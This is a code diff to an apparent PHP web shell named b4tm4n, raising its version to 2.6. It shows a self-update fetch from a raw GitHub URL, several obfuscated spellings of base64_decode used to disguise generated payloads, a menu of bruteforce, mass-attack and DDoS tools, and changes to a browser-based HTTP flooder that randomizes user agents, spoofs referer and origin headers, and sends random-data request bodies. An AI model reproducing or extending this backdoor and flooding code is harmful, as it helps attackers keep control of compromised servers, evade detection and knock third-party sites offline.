@@ -476,7 +476,7 @@ function Evil($x,$y=false)
 	if(error_get_last())
 	{
 		print "\n[Error] ";
-	    return print_r(error_get_last());
+		return print_r(error_get_last());
 	}
 	return $evil;
 }
@@ -950,7 +950,7 @@ function MapDrive($x)
 function MainMenu() 
 {
 	$menu=array(
-		"ExpL"			=> "?d=".urle(getcwd()),
+		"ExpL"          => "?d=".urle(getcwd()),
 		"&#9733; Sec."	=> "?x=secure",
 		"Info"          => "?x=info",
 		"Database"      => "?x=db",
@@ -3020,7 +3020,7 @@ if(any("x",$_REQUEST))
 	if($_REQUEST['x']=="update")
 	{
 		$link_update='https://raw.githubusercontent.com/k4mpr3t/b4tm4n/master/bat.php';
-		$current_version=2.5; //Sensitive Case Variable
+		$current_version=2.6; //Sensitive Case Variable
 
 		if($config['debug']==true)
 		{
@@ -3069,10 +3069,10 @@ if(any("x",$_REQUEST))
 			$rand2="\$".substr(str_shuffle("abcdefghijklmnopqrstuvwxyz"),0,rand(2,5));
 			$b64=array(
 				'"\142\141\163\x65\66\x34\137\x64\x65\x63\157\144\145"',
-				'strrev("ed"."oce"."d_4"."6es"."ab")', 
-				'strrev("e"."doc"."ed_"."46e"."sab")', 
+				'strrev("ed"."oce"."d_4"."6es"."ab")',
+				'strrev("e"."doc"."ed_"."46e"."sab")',
 				'"b"."as"."e6"."4_"."d"."ec"."o"."de"',
-				'"ba"."se"."6"."4_d"."e"."cod"."e"'
+				'"ba"."se"."6"."4_d"."e"."cod"."e"' 
 			);
 			$rand_b64=array_rand($b64);
 			$rand3=$b64[$rand_b64];
@@ -3122,7 +3122,7 @@ if(any("z",$_REQUEST))
 	"form-bruteforces"=>array("title"=>"Form Bruteforces","ver"=>"1.0","auth"=>"k4mpr3t"),
 	"login-bruteforces"=>array("title"=>"Login Bruteforces","ver"=>"1.0","auth"=>"k4mpr3t"),
 	"mass-tools"=>array("title"=>"Mass Tools","ver"=>"1.0","auth"=>"k4mpr3t"),
-	"ddos-attack"=>array("title"=>"DDOS Attack","ver"=>"1.2","auth"=>"k4mpr3t"),
+	"ddos-attack"=>array("title"=>"DDOS Attack","ver"=>"2.0","auth"=>"k4mpr3t"),
 	));
 
 	print "<div id='tools'>";
@@ -3724,6 +3724,9 @@ if(any("z",$_REQUEST))
 					        size=document.getElementById("size"),
 					        time=document.getElementById("time"),
 					        stamp=document.getElementById("stamp")
+					        uagent=document.getElementById("uagent")
+					        referer=document.getElementById("referer")
+					        origin=document.getElementById("origin")
 
 						var requests=0,
 					        succeeded=0,
@@ -3747,9 +3750,9 @@ if(any("z",$_REQUEST))
 							rand=Math.floor((Math.random()*arr.length));
 						    return arr[rand];}
 							xhrx.open(method.value,targetNode.value,true);
-							xhrx.setRequestHeader("user-agent",randomize(agent));
-							xhrx.setRequestHeader("referer",targetNode.value);
-							xhrx.setRequestHeader("origin","*");
+							if (uagent.checked) xhrx.setRequestHeader("user-agent",randomize(agent));
+							if (referer.checked) xhrx.setRequestHeader("referer",targetNode.value);
+							if (origin.checked) xhrx.setRequestHeader("origin","*");
 							xhrx.onreadystatechange=function(){
 							    if(xhrx.readyState==XMLHttpRequest.DONE){
 							    	if(xhrx.status>=500){
@@ -3760,15 +3763,15 @@ if(any("z",$_REQUEST))
 							   	onRequest();
 							}
 							xhttp=xhrx;
-							attack=function(length){
-							str="";
-							array=new Uint32Array(length);
-							window.crypto.getRandomValues(array);
-							for(var j=0;j<size.value*24;j++){
-							for(var i=0;i<array.length;i++){
-							str+=String.fromCharCode(array[i]);}
-							};return str;}
-							data.append(stamp.value,attack(buff));
+							attack=function(){
+							str="";arr=new Uint32Array(buff);
+							window.crypto.getRandomValues(arr);
+							for(var i=0;i<arr.length;i++){
+							str+=String.fromCharCode(arr[i]);
+							}return str;}
+							what=attack();
+							for(var j=0;j<size.value;j++){
+							data.append(what, stamp.value);}
 							xhrx.send(data);
 					        };
 
@@ -3838,8 +3841,12 @@ if(any("z",$_REQUEST))
 					<option value="CONNECT">CONNECT</option>
 					<option value="OPTIONS">OPTIONS</option>
 					</select><br>
-					<label>Size (MB)</label><input type="number" id="size" value="1024"><br>
+					<label>Size (kB)</label><input type="number" id="size" value="1024"><br>
 					<label>Time (ms)</label><input type="number" id="time" value="500"><br>
+					<label>Options</label>
+					<input type="checkbox" id="uagent" name="uagent" style="vertical-align:middle"> User Agent
+					<input type="checkbox" id="referer" name="referer" style="vertical-align:middle"> Referer  Target
+					<input type="checkbox" id="origin" name="origin" style="vertical-align:middle"> Origin<br>
 					<label style="margin:5px 0px 5px">
 						Time <span id="times">00:00:00</span> | 
 						Start <span id="start">00:00:00</span> | 
